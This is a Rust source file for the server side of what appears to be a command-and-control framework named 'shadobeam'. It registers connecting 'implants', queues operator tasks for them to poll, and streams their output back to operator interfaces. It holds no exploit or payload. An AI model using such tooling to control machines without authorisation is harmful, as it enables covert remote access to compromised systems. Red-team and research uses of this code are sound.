use std::collections::HashMap;
use std::ops::Deref;
use std::pin::Pin;
use std::sync::Arc;

use shadobeam_proto::{
    iface::{
        self, interface_service_server::InterfaceService, AddTaskRequest, AddTaskResponse,
        ImplantInfoRequest, ImplantInfoResponse,
    },
    tasks::{
        beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, OutputRequest,
        OutputResponse, PollRequest, PollResponse,
    },
    ImplantControl, ImplantInfo, OutputResult,
};

use tokio::sync::{mpsc, RwLock};
use tonic::{Request, Response, Status};
use uuid::Uuid;

use futures_core::Stream;
use futures_util::StreamExt;

use super::{
    implant::{Implant, Implants},
    interface::{Interface, Interfaces},
};

const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant

#[derive(Debug, Default)]
pub struct BeaconArc(Arc<Beacon>);

impl Clone for BeaconArc {
    fn clone(&self) -> Self {
        Self(Arc::clone(&self.0))
    }
}
impl Deref for BeaconArc {
    type Target = Beacon;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

#[derive(Debug, Default)]
pub struct Beacon {
    implants: Implants,
    interfaces: Interfaces,
    running_tasks: RwLock<HashMap<Uuid, Vec<mpsc::UnboundedSender<OutputResult>>>>,
}
impl Beacon {
    #[allow(clippy::new_ret_no_self)]
    pub fn new() -> BeaconArc {
        BeaconArc(Arc::new(Self::default()))
    }
}
impl Deref for Beacon {
    type Target = Implants;

    fn deref(&self) -> &Self::Target {
        &self.implants
    }
}

#[tonic::async_trait]
impl BeaconService for BeaconArc {
    async fn connection(
        &self,
        request: Request<ConnectionRequest>,
    ) -> Result<Response<ConnectionResponse>, Status> {
        let uuid = Uuid::new_v4();

        println!("Got a connection request: {uuid}");
        let ip = request
            .remote_addr()
            .ok_or(Status::not_found("Connection issue: Socket not found."))?;

        let info = ImplantInfo::new(ip, uuid);
        self.implants.add(uuid, Implant::new(info.clone())).await;
        self.interfaces
            .implant_control(ImplantControl::Add(info))
            .await;

        Ok(Response::new(ConnectionResponse {
            uuid: Some(uuid.into()),
            heartbeat: HEARTBEAT,
        }))
    }

    async fn poll(&self, request: Request<PollRequest>) -> Result<Response<PollResponse>, Status> {
        let id = request.into_inner().uuid.unwrap().into();

        let implant = self.implants.get(&id).await.ok_or(Status::not_found(
            "Client doesn't exist or isn't connected.",
        ))?;

        let task = implant.pop_task().await.map(|t| t.into());
        Ok(Response::new(PollResponse { task }))
    }

    async fn output(
        &self,
        request: Request<tonic::Streaming<OutputRequest>>,
    ) -> Result<Response<OutputResponse>, Status> {
        let mut stream = request.into_inner();

        while let Some(request) = stream.next().await {
            let request = request?;
            let task_id = request.task_uuid.unwrap().into();

            let tasks = self.running_tasks.read().await;

            for s in tasks
                .get(&task_id)
                .ok_or(Status::not_found("Running task uuid not found."))?
                .iter()
            {
                s.send(Into::<OutputResult>::into(request.output.clone().unwrap()))
                    .map_err(|_| Status::aborted("Interface channel closed."))?;
            }
        }
        Ok(Response::new(OutputResponse {}))
    }
}

#[tonic::async_trait]
impl InterfaceService for BeaconArc {
    async fn connection(
        &self,
        _request: Request<iface::ConnectionRequest>,
    ) -> Result<Response<iface::ConnectionResponse>, Status> {
        let uuid = Uuid::new_v4();

        println!("Got an interface connection request: {uuid}");

        self.interfaces.add(uuid, Interface::new()).await;

        Ok(Response::new(iface::ConnectionResponse {
            uuid: Some(uuid.into()),
        }))
    }

    type ImplantInfoStream =
        Pin<Box<dyn Stream<Item = Result<ImplantInfoResponse, Status>> + Send + 'static>>;

    async fn implant_info(
        &self,
        request: Request<ImplantInfoRequest>,
    ) -> Result<Response<Self::ImplantInfoStream>, Status> {
        let uuid = request.into_inner().uuid.unwrap().into();

        let (tx, mut rx) = mpsc::unbounded_channel::<ImplantControl>();

        // Need to send existing implants if any exist
        for info in self.implants.list().await {
            tx.send(info.into()).unwrap();
        }

        self.interfaces
            .set_channel(uuid, tx)
            .await
            .map_err(|e| Status::not_found(e.to_string()))?;

        let output = async_stream::try_stream! {
            while let Some(info) = rx.recv().await {
                yield ImplantInfoResponse { itype: Some(info.into()) };
            }
        };
        Ok(Response::new(Box::pin(output) as Self::ImplantInfoStream))
    }

    type AddTaskStream =
        Pin<Box<dyn Stream<Item = Result<AddTaskResponse, Status>> + Send + 'static>>;

    async fn add_task(
        &self,
        request: Request<AddTaskRequest>,
    ) -> Result<Response<Self::AddTaskStream>, Status> {
        let request = request.into_inner();
        let id = request.client_uuid.unwrap().into();

        let task = request
            .task
            .ok_or(Status::invalid_argument("Task should not be None."))?;
        let task_id = task.uuid.clone().unwrap().into();

        let implant = self.implants.get(&id).await.ok_or(Status::not_found(
            "Implant doesn't exist or isn't connected.",
        ))?;

        let task = task.into();
        dbg!(&task);
        implant.push_task(task).await;

        let (tx, mut rx) = mpsc::unbounded_channel::<OutputResult>();
        let mut tasks = self.running_tasks.write().await;
        tasks.insert(task_id, vec![tx]);

        let output = async_stream::try_stream! {
            while let Some(output) = rx.recv().await {
                yield AddTaskResponse { output: Some(output.into()) };
            }
        };
        Ok(Response::new(Box::pin(output) as Self::AddTaskStream))
    }
}
